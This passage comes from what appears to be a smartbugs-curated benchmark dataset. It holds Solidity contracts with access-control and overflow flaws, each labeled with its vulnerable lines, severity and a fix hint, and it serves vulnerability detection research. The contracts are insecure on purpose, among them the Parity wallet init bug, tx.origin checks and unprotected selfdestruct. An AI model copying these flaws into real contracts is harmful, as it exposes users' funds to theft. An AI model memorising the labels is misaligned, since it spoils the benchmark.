the operation hash, how much, and to whom it's going).\n  event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);\n  // Confirmation still needed for a transaction.\n  event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);\n}\n\ncontract WalletAbi {\n  // Revokes a prior confirmation of the given operation\n  function revoke(bytes32 _operation) external;\n\n  // Replaces an owner `_from` with another `_to`.\n  function changeOwner(address _from, address _to) external;\n\n  function addOwner(address _owner) external;\n\n  function removeOwner(address _owner) external;\n\n  function changeRequirement(uint _newRequired) external;\n\n  function isOwner(address _addr) constant returns (bool);\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);\n\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function setDailyLimit(uint _newLimit) external;\n\n  function execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);\n  function confirm(bytes32 _h) returns (bool o_success);\n}\n\ncontract WalletLibrary is WalletEvents {\n  // TYPES\n\n  // struct for the status of a pending operation.\n  struct PendingState {\n    uint yetNeeded;\n    uint ownersDone;\n    uint index;\n  }\n\n  // Transaction structure to remember details of transaction lest it need be saved for a later call.\n  struct Transaction {\n    address to;\n    uint value;\n    bytes data;\n  }\n\n  // MODIFIERS\n\n  // simple single-sig function modifier.\n  modifier onlyowner {\n    if (isOwner(msg.sender))\n      _;\n  }\n  // multi-sig function modifier: the operation must have an intrinsic hash in order\n  // that later attempts can be realised as the same underlying operation and\n  // thus count as confirmations.\n  modifier onlymanyowners(bytes32 _operation) {\n    if (confirmAndCheck(_operation))\n      _;\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n  }\n\n  // constructor is given number of sigs required to do protected \"onlymanyowners\" transactions\n  // as well as the selection of addresses capable of confirming them.\n  function initMultiowned(address[] _owners, uint _required) only_uninitialized {\n    m_numOwners = _owners.length + 1;\n    m_owners[1] = uint(msg.sender);\n    m_ownerIndex[uint(msg.sender)] = 1;\n    for (uint i = 0; i < _owners.length; ++i)\n    {\n      m_owners[2 + i] = uint(_owners[i]);\n      m_ownerIndex[uint(_owners[i])] = 2 + i;\n    }\n    m_required = _required;\n  }\n\n  // Revokes a prior confirmation of the given operation\n  function revoke(bytes32 _operation) external {\n    uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n    // make sure they're an owner\n    if (ownerIndex == 0) return;\n    uint ownerIndexBit = 2**ownerIndex;\n    var pending = m_pending[_operation];\n    if (pending.ownersDone & ownerIndexBit > 0) {\n      pending.yetNeeded++;\n      pending.ownersDone -= ownerIndexBit;\n      Revoke(msg.sender, _operation);\n    }\n  }\n\n  // Replaces an owner `_from` with another `_to`.\n  function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {\n    if (isOwner(_to)) return;\n    uint ownerIndex = m_ownerIndex[uint(_from)];\n    if (ownerIndex == 0) return;\n\n    clearPending();\n    m_owners[ownerIndex] = uint(_to);\n    m_ownerIndex[uint(_from)] = 0;\n    m_ownerIndex[uint(_to)] = ownerIndex;\n    OwnerChanged(_from, _to);\n  }\n\n  function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\n    if (isOwner(_owner)) return;\n\n    clearPending();\n    if (m_numOwners >= c_maxOwners)\n      reorganizeOwners();\n    if (m_numOwners >= c_maxOwners)\n      return;\n    m_numOwners++;\n    m_owners[m_numOwners] = uint(_owner);\n    m_ownerIndex[uint(_owner)] = m_numOwners;\n    OwnerAdded(_owner);\n  }\n\n  function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {\n    uint ownerIndex = m_ownerIndex[uint(_owner)];\n    if (ownerIndex == 0) return;\n    if (m_required > m_numOwners - 1) return;\n\n    m_owners[ownerIndex] = 0;\n    m_ownerIndex[uint(_owner)] = 0;\n    clearPending();\n    reorganizeOwners(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot\n    OwnerRemoved(_owner);\n  }\n\n  function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {\n    if (_newRequired > m_numOwners) return;\n    m_required = _newRequired;\n    clearPending();\n    RequirementChanged(_newRequired);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function getOwner(uint ownerIndex) external constant returns (address) {\n    return address(m_owners[ownerIndex + 1]);\n  }\n\n  function isOwner(address _addr) constant returns (bool) {\n    return m_ownerIndex[uint(_addr)] > 0;\n  }\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\n    var pending = m_pending[_operation];\n    uint ownerIndex = m_ownerIndex[uint(_owner)];\n\n    // make sure they're an owner\n    if (ownerIndex == 0) return false;\n\n    // determine the bit to set for this owner.\n    uint ownerIndexBit = 2**ownerIndex;\n    return !(pending.ownersDone & ownerIndexBit == 0);\n  }\n\n  // constructor - stores initial daily limit and records the present day's index.\n  function initDaylimit(uint _limit) only_uninitialized {\n    m_dailyLimit = _limit;\n    m_lastDay = today();\n  }\n  // (re)sets the daily limit. needs many of the owners to confirm. doesn't alter the amount already spent today.\n  function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {\n    m_dailyLimit = _newLimit;\n  }\n  // resets the amount already spent today. needs many of the owners to confirm.\n  function resetSpentToday() onlymanyowners(sha3(msg.data)) external {\n    m_spentToday = 0;\n  }\n\n  // throw unless the contract is not yet initialized.\n  modifier only_uninitialized { if (m_numOwners > 0) throw; _; }\n\n  // constructor - just pass on the owner array to the multiowned and\n  // the limit to daylimit\n  // <yes> <report> ACCESS_CONTROL\n  function initWallet(address[] _owners, uint _required, uint _daylimit) only_uninitialized {\n    initDaylimit(_daylimit);\n    initMultiowned(_owners, _required);\n  }\n\n  // kills the contract sending everything to `_to`.\n  // <yes> <report> ACCESS_CONTROL\n  function kill(address _to) onlymanyowners(sha3(msg.data)) external {\n    suicide(_to);\n  }\n\n  // Outside-visible transact entry point. Executes transaction immediately if below daily spend limit.\n  // If not, goes into multisig process. We provide a hash on return to allow the sender to provide\n  // shortcuts for the other confirmations (allowing them to avoid replicating the _to, _value\n  // and _data arguments). They still get the option of using them if they want, anyways.\n  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {\n    // first, take the opportunity to check that we're under the daily limit.\n    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {\n      // yes - just execute the call.\n      address created;\n      if (_to == 0) {\n        created = create(_value, _data);\n      } else {\n        if (!_to.call.value(_value)(_data))\n          throw;\n      }\n      SingleTransact(msg.sender, _value, _to, _data, created);\n    } else {\n      // determine our operation hash.\n      o_hash = sha3(msg.data, block.number);\n      // store if it's new\n      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {\n        m_txs[o_hash].to = _to;\n        m_txs[o_hash].value = _value;\n        m_txs[o_hash].data = _data;\n      }\n      if (!confirm(o_hash)) {\n        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);\n      }\n    }\n  }\n\n  function create(uint _value, bytes _code) internal returns (address o_addr) {\n    /*\n    assembly {\n      o_addr := create(_value, add(_code, 0x20), mload(_code))\n      jumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))\n    }\n    */\n  }\n\n  // confirm a transaction through just the hash. we use the previous transactions map, m_txs, in order\n  // to determine the body of the transaction from the hash provided.\n  function confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {\n    if (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {\n      address created;\n      if (m_txs[_h].to == 0) {\n        created = create(m_txs[_h].value, m_txs[_h].data);\n      } else {\n        if (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))\n          throw;\n      }\n\n      MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);\n      delete m_txs[_h];\n      return true;\n    }\n  }\n\n  // INTERNAL METHODS\n\n  function confirmAndCheck(bytes32 _operation) internal returns (bool) {\n    // determine what index the present sender is:\n    uint ownerIndex = m_ownerIndex[uint(msg.sender)];\n    // make sure they're an owner\n    if (ownerIndex == 0) return;\n\n    var pending = m_pending[_operation];\n    // if we're not yet working on this operation, switch over and reset the confirmation status.\n    if (pending.yetNeeded == 0) {\n      // reset count of confirmations needed.\n      pending.yetNeeded = m_required;\n      // reset which owners have confirmed (none) - set our bitmap to 0.\n      pending.ownersDone = 0;\n      pending.index = m_pendingIndex.length++;\n      m_pendingIndex[pending.index] = _operation;\n    }\n    // determine the bit to set for this owner.\n    uint ownerIndexBit = 2**ownerIndex;\n    // make sure we (the message sender) haven't confirmed this operation previously.\n    if (pending.ownersDone & ownerIndexBit == 0) {\n      Confirmation(msg.sender, _operation);\n      // ok - check if count is enough to go ahead.\n      if (pending.yetNeeded <= 1) {\n        // enough confirmations: reset and run interior.\n        delete m_pendingIndex[m_pending[_operation].index];\n        delete m_pending[_operation];\n        return true;\n      }\n      else\n      {\n        // not enough: record that this owner in particular confirmed.\n        pending.yetNeeded--;\n        pending.ownersDone |= ownerIndexBit;\n      }\n    }\n  }\n\n  function reorganizeOwners() private {\n    uint free = 1;\n    while (free < m_numOwners)\n    {\n      while (free < m_numOwners && m_owners[free] != 0) free++;\n      while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\n      if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)\n      {\n        m_owners[free] = m_owners[m_numOwners];\n        m_ownerIndex[m_owners[free]] = free;\n        m_owners[m_numOwners] = 0;\n      }\n    }\n  }\n\n  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and\n  // returns true. otherwise just returns false.\n  function underLimit(uint _value) internal onlyowner returns (bool) {\n    // reset the spend limit if we're on a different day to last time.\n    if (today() > m_lastDay) {\n      m_spentToday = 0;\n      m_lastDay = today();\n    }\n    // check to see if there's enough left - if so, subtract and return true.\n    // overflow protection                    // dailyLimit check\n    if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\n      m_spentToday += _value;\n      return true;\n    }\n    return false;\n  }\n\n  // determines today's index.\n  function today() private constant returns (uint) { return now / 1 days; }\n\n  function clearPending() internal {\n    uint length = m_pendingIndex.length;\n\n    for (uint i = 0; i < length; ++i) {\n      delete m_txs[m_pendingIndex[i]];\n\n      if (m_pendingIndex[i] != 0)\n        delete m_pending[m_pendingIndex[i]];\n    }\n\n    delete m_pendingIndex;\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public m_required;\n  // pointer used to find a free slot in m_owners\n  uint public m_numOwners;\n\n  uint public m_dailyLimit;\n  uint public m_spentToday;\n  uint public m_lastDay;\n\n  // list of owners\n  uint[256] m_owners;\n\n  uint constant c_maxOwners = 250;\n  // index on the list of owners to allow reverse lookup\n  mapping(uint => uint) m_ownerIndex;\n  // the ongoing operations.\n  mapping(bytes32 => PendingState) m_pending;\n  bytes32[] m_pendingIndex;\n\n  // pending transactions we have at present.\n  mapping (bytes32 => Transaction) m_txs;\n}\n",
    "vulnerable_function": "initWallet",
    "vulnerable_lines": [
      226
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 3,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 226",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/parity_wallet_bug_2.sol",
    "pragma": "0.4.9",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-106#walletlibrarysol"
  },
  {
    "id": "smartbugs_access_control_phishable",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "phishable.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 20\n */\n\n pragma solidity ^0.4.22;\n\n contract Phishable {\n    address public owner;\n\n    constructor (address _owner) {\n        owner = _owner;\n    }\n\n    function () public payable {} // collect ether\n\n    function withdrawAll(address _recipient) public {\n        // <yes> <report> ACCESS_CONTROL\n        require(tx.origin == owner);\n        _recipient.transfer(this.balance);\n    }\n}\n",
    "vulnerable_function": "withdrawAll",
    "vulnerable_lines": [
      20
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 20",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/phishable.sol",
    "pragma": "0.4.22",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_access_control_proxy",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "proxy.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-112#proxysol\n * @author: -\n * @vulnerable_at_lines: 19\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy {\n\n  address owner;\n\n  constructor() public {\n    owner = msg.sender;\n  }\n\n  function forward(address callee, bytes _data) public {\n    // <yes> <report> ACCESS_CONTROL\n    require(callee.delegatecall(_data)); //Use delegatecall with caution and make sure to never call into untrusted contracts\n  }\n\n}\n",
    "vulnerable_function": "forward",
    "vulnerable_lines": [
      19
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 19",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/proxy.sol",
    "pragma": "0.4.24",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-112#proxysol"
  },
  {
    "id": "smartbugs_access_control_rubixi",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "rubixi.sol",
    "file_content": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/Rubixi_source_code/Rubixi.sol\n * @author: -\n* @vulnerable_at_lines: 23,24\n */\n\n // 0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code\n pragma solidity ^0.4.15;\n\n contract Rubixi {\n\n         //Declare variables for storage critical to contract\n         uint private balance = 0;\n         uint private collectedFees = 0;\n         uint private feePercent = 10;\n         uint private pyramidMultiplier = 300;\n         uint private payoutOrder = 0;\n\n         address private creator;\n\n         //Sets creator\n         // <yes> <report> ACCESS_CONTROL\n         function DynamicPyramid() {\n                 creator = msg.sender; //anyone can call this\n         }\n\n         modifier onlyowner {\n                 if (msg.sender == creator) _;\n         }\n\n         struct Participant {\n                 address etherAddress;\n                 uint payout;\n         }\n\n         Participant[] private participants;\n\n         //Fallback function\n         function() {\n                 init();\n         }\n\n         //init function run on fallback\n         function init() private {\n                 //Ensures only tx with value of 1 ether or greater are processed and added to pyramid\n                 if (msg.value < 1 ether) {\n                         collectedFees += msg.value;\n                         return;\n                 }\n\n                 uint _fee = feePercent;\n                 //50% fee rebate on any ether value of 50 or greater\n                 if (msg.value >= 50 ether) _fee /= 2;\n\n                 addPayout(_fee);\n         }\n\n         //Function called for valid tx to the contract\n         function addPayout(uint _fee) private {\n                 //Adds new address to participant array\n                 participants.push(Participant(msg.sender, (msg.value * pyramidMultiplier) / 100));\n\n                 //These statements ensure a quicker payout system to later pyramid entrants, so the pyramid has a longer lifespan\n                 if (participants.length == 10) pyramidMultiplier = 200;\n                 else if (participants.length == 25) pyramidMultiplier = 150;\n\n                 // collect fees and update contract balance\n                 balance += (msg.value * (100 - _fee)) / 100;\n                 collectedFees += (msg.value * _fee) / 100;\n\n                 //Pays earlier participiants if balance sufficient\n                 while (balance > participants[payoutOrder].payout) {\n                         uint payoutToSend = participants[payoutOrder].payout;\n                         participants[payoutOrder].etherAddress.send(payoutToSend);\n\n                         balance -= participants[payoutOrder].payout;\n                         payoutOrder += 1;\n                 }\n         }\n\n         //Fee functions for creator\n         function collectAllFees() onlyowner {\n                 if (collectedFees == 0) throw;\n\n                 creator.send(collectedFees);\n                 collectedFees = 0;\n         }\n\n         function collectFeesInEther(uint _amt) onlyowner {\n                 _amt *= 1 ether;\n                 if (_amt > collectedFees) collectAllFees();\n\n                 if (collectedFees == 0) throw;\n\n                 creator.send(_amt);\n                 collectedFees -= _amt;\n         }\n\n         function collectPercentOfFees(uint _pcent) onlyowner {\n                 if (collectedFees == 0 || _pcent > 100) throw;\n\n                 uint feesToCollect = collectedFees / 100 * _pcent;\n                 creator.send(feesToCollect);\n                 collectedFees -= feesToCollect;\n         }\n\n         //Functions for changing variables related to the contract\n         function changeOwner(address _owner) onlyowner {\n                 creator = _owner;\n         }\n\n         function changeMultiplier(uint _mult) onlyowner {\n                 if (_mult > 300 || _mult < 120) throw;\n\n                 pyramidMultiplier = _mult;\n         }\n\n         function changeFeePercentage(uint _fee) onlyowner {\n                 if (_fee > 10) throw;\n\n                 feePercent = _fee;\n         }\n\n         //Functions to provide information to end-user using JSON interface or other interfaces\n         function currentMultiplier() constant returns(uint multiplier, string info) {\n                 multiplier = pyramidMultiplier;\n                 info = 'This multiplier applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, multiplier is x100 for a fractional multiplier e.g. 250 is actually a 2.5x multiplier. Capped at 3x max and 1.2x min.';\n         }\n\n         function currentFeePercentage() constant returns(uint fee, string info) {\n                 fee = feePercent;\n                 info = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)';\n         }\n\n         function currentPyramidBalanceApproximately() constant returns(uint pyramidBalance, string info) {\n                 pyramidBalance = balance / 1 ether;\n                 info = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';\n         }\n\n         function nextPayoutWhenPyramidBalanceTotalsApproximately() constant returns(uint balancePayout) {\n                 balancePayout = participants[payoutOrder].payout / 1 ether;\n         }\n\n         function feesSeperateFromBalanceApproximately() constant returns(uint fees) {\n                 fees = collectedFees / 1 ether;\n         }\n\n         function totalParticipants() constant returns(uint count) {\n                 count = participants.length;\n         }\n\n         function numberOfParticipantsWaitingForPayout() constant returns(uint count) {\n                 count = participants.length - payoutOrder;\n         }\n\n         function participantDetails(uint orderInPyramid) constant returns(address Address, uint Payout) {\n                 if (orderInPyramid <= participants.length) {\n                         Address = participants[orderInPyramid].etherAddress;\n                         Payout = participants[orderInPyramid].payout / 1 ether;\n                 }\n         }\n }\n",
    "vulnerable_function": "DynamicPyramid",
    "vulnerable_lines": [
      23,
      24
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 23, 24",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/rubixi.sol",
    "pragma": "0.4.15",
    "source_url": "https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/Rubixi_source_code/Rubixi.sol"
  },
  {
    "id": "smartbugs_access_control_simple_suicide",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "simple_suicide.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/unprotected_critical_functions/simple_suicide.sol\n * @author: -\n * @vulnerable_at_lines: 12,13\n */\n\n//added prgma version\npragma solidity ^0.4.0;\n\ncontract SimpleSuicide {\n  // <yes> <report> ACCESS_CONTROL\n  function sudicideAnyone() {\n    selfdestruct(msg.sender);\n  }\n\n}\n",
    "vulnerable_function": "sudicideAnyone",
    "vulnerable_lines": [
      12,
      13
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 12, 13",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/simple_suicide.sol",
    "pragma": "0.4.0",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/unprotected_critical_functions/simple_suicide.sol"
  },
  {
    "id": "smartbugs_access_control_unprotected0",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "unprotected0.sol",
    "file_content": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/unprotected_function/Unprotected.sol\n * @author: -\n * @vulnerable_at_lines: 25\n */\n\n pragma solidity ^0.4.15;\n\n contract Unprotected{\n     address private owner;\n\n     modifier onlyowner {\n         require(msg.sender==owner);\n         _;\n     }\n\n     function Unprotected()\n         public\n     {\n         owner = msg.sender;\n     }\n\n     // This function should be protected\n     // <yes> <report> ACCESS_CONTROL\n     function changeOwner(address _newOwner)\n         public\n     {\n        owner = _newOwner;\n     }\n\n    /*\n    function changeOwner_fixed(address _newOwner)\n         public\n         onlyowner\n     {\n        owner = _newOwner;\n     }\n     */\n }\n",
    "vulnerable_function": "changeOwner",
    "vulnerable_lines": [
      25
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 25",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/unprotected0.sol",
    "pragma": "0.4.15",
    "source_url": "https://github.com/trailofbits/not-so-smart-contracts/blob/master/unprotected_function/Unprotected.sol"
  },
  {
    "id": "smartbugs_access_control_wallet_02_refund_nosub",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "wallet_02_refund_nosub.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-02-refund-nosubsol\n * @author: -\n * @vulnerable_at_lines: 36\n */\n\n pragma solidity ^0.4.24;\n\n /* User can add pay in and withdraw Ether.\n    Unfortunately the developer forgot set the user's balance to 0 when refund() is called.\n    An attacker can pay in a small amount of Ether and call refund() repeatedly to empty the contract.\n */\n\n contract Wallet {\n     address creator;\n\n     mapping(address => uint256) balances;\n\n     constructor() public {\n         creator = msg.sender;\n     }\n\n     function deposit() public payable {\n         assert(balances[msg.sender] + msg.value > balances[msg.sender]);\n         balances[msg.sender] += msg.value;\n     }\n\n     function withdraw(uint256 amount) public {\n         require(amount <= balances[msg.sender]);\n         msg.sender.transfer(amount);\n         balances[msg.sender] -= amount;\n     }\n\n     function refund() public {\n         // <yes> <report> ACCESS_CONTROL\n         msg.sender.transfer(balances[msg.sender]);\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function migrateTo(address to) public {\n         require(creator == msg.sender);\n         to.transfer(this.balance);\n     }\n\n }\n",
    "vulnerable_function": "refund",
    "vulnerable_lines": [
      36
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 36",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/wallet_02_refund_nosub.sol",
    "pragma": "0.4.24",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-02-refund-nosubsol"
  },
  {
    "id": "smartbugs_access_control_wallet_03_wrong_constructor",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "wallet_03_wrong_constructor.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-03-wrong-constructorsol\n * @author: -\n * @vulnerable_at_lines: 19,20\n */\n\n pragma solidity ^0.4.24;\n\n /* User can add pay in and withdraw Ether.\n    The constructor is wrongly named, so anyone can become 'creator' and withdraw all funds.\n */\n\n contract Wallet {\n     address creator;\n\n     mapping(address => uint256) balances;\n     \n     // <yes> <report> ACCESS_CONTROL\n     function initWallet() public {\n         creator = msg.sender;\n     }\n\n     function deposit() public payable {\n         assert(balances[msg.sender] + msg.value > balances[msg.sender]);\n         balances[msg.sender] += msg.value;\n     }\n\n     function withdraw(uint256 amount) public {\n         require(amount <= balances[msg.sender]);\n         msg.sender.transfer(amount);\n         balances[msg.sender] -= amount;\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function migrateTo(address to) public {\n         require(creator == msg.sender);\n         to.transfer(this.balance);\n     }\n\n }\n",
    "vulnerable_function": "initWallet",
    "vulnerable_lines": [
      19,
      20
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 19, 20",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/wallet_03_wrong_constructor.sol",
    "pragma": "0.4.24",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-03-wrong-constructorsol"
  },
  {
    "id": "smartbugs_access_control_wallet_04_confused_sign",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "wallet_04_confused_sign.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-04-confused-signsol\n * @author: -\n * @vulnerable_at_lines: 30\n */\n\n pragma solidity ^0.4.24;\n\n /* User can add pay in and withdraw Ether.\n    Unfortunatelty, the developer was drunk and used the wrong comparison operator in \"withdraw()\"\n    Anybody can withdraw arbitrary amounts of Ether :()\n */\n\n contract Wallet {\n     address creator;\n\n     mapping(address => uint256) balances;\n\n     constructor() public {\n         creator = msg.sender;\n     }\n\n     function deposit() public payable {\n         assert(balances[msg.sender] + msg.value > balances[msg.sender]);\n         balances[msg.sender] += msg.value;\n     }\n\n     function withdraw(uint256 amount) public {\n         // <yes> <report> ACCESS_CONTROL\n         require(amount >= balances[msg.sender]);\n         msg.sender.transfer(amount);\n         balances[msg.sender] -= amount;\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function migrateTo(address to) public {\n         require(creator == msg.sender);\n         to.transfer(this.balance);\n     }\n\n }\n",
    "vulnerable_function": "withdraw",
    "vulnerable_lines": [
      30
    ],
    "vulnerability_type": "access_control",
    "original_category": "access_control",
    "severity": "high",
    "difficulty_tier": 1,
    "description": "Access control vulnerability - missing or incorrect authorization checks at line(s) 30",
    "fix_description": "Add proper access control modifiers (onlyOwner, require statements) or avoid tx.origin",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/access_control/wallet_04_confused_sign.sol",
    "pragma": "0.4.24",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-04-confused-signsol"
  },
  {
    "id": "smartbugs_arithmetic_BECToken",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "BECToken.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#bectokensol\n * @author: -\n * @vulnerable_at_lines: 264\n */\n\npragma solidity ^0.4.16;\n\n/**\n * @title SafeMath\n * @dev Math operations with safety checks that throw on error\n */\nlibrary SafeMath {\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n    uint256 c = a * b;\n    require(a == 0 || c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\n    // require(b > 0); // Solidity automatically throws when dividing by 0\n    uint256 c = a / b;\n    // require(a == b * c + a % b); // There is no case in which this doesn't hold\n    return c;\n  }\n\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n    require(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\n    uint256 c = a + b;\n    require(c >= a);\n    return c;\n  }\n}\n\n/**\n * @title ERC20Basic\n * @dev Simpler version of ERC20 interface\n * @dev see https://github.com/ethereum/EIPs/issues/179\n */\ncontract ERC20Basic {\n  uint256 public totalSupply;\n  function balanceOf(address who) public constant returns (uint256);\n  function transfer(address to, uint256 value) public returns (bool);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\n/**\n * @title Basic token\n * @dev Basic version of StandardToken, with no allowances.\n */\ncontract BasicToken is ERC20Basic {\n  using SafeMath for uint256;\n\n  mapping(address => uint256) balances;\n\n  /**\n  * @dev transfer token for a specified address\n  * @param _to The address to transfer to.\n  * @param _value The amount to be transferred.\n  */\n  function transfer(address _to, uint256 _value) public returns (bool) {\n    require(_to != address(0));\n    require(_value > 0 && _value <= balances[msg.sender]);\n\n    // SafeMath.sub will throw if there is not enough balance.\n    balances[msg.sender] = balances[msg.sender].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    Transfer(msg.sender, _to, _value);\n    return true;\n  }\n\n  /**\n  * @dev Gets the balance of the specified address.\n  * @param _owner The address to query the the balance of.\n  * @return An uint256 representing the amount owned by the passed address.\n  */\n  function balanceOf(address _owner) public constant returns (uint256 balance) {\n    return balances[_owner];\n  }\n}\n\n/**\n * @title ERC20 interface\n * @dev see 